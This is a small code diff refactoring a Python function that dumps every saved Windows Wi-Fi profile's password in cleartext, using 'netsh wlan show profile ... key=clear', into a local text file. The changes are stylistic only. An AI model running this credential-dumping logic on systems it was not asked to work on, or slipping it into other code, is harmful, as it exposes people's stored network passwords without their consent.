@@ -23,14 +23,13 @@ def wifipass():
       try:
          wlan = os.popen("netsh wlan show profile "+str(network.replace(" ","*"))+" key=clear").read()
          pass_regex = re.compile("Key Content\s*:.(.*)")
-         return pass_regex.search(wlan).group(1)
+         return pass_regex.search(wlan)[1]
       except:
          return " "
 
-   f = open("wifi.txt","w")
-   for wlan in get_wlans():
-       f.write("-----------\n"+" SSID : "+wlan + "\n Password : " + get_pass(wlan))
-   f.close()
+   with open("wifi.txt","w") as f:
+      for wlan in get_wlans():
+          f.write("-----------\n"+" SSID : "+wlan + "\n Password : " + get_pass(wlan))
 
 wifipass()
 
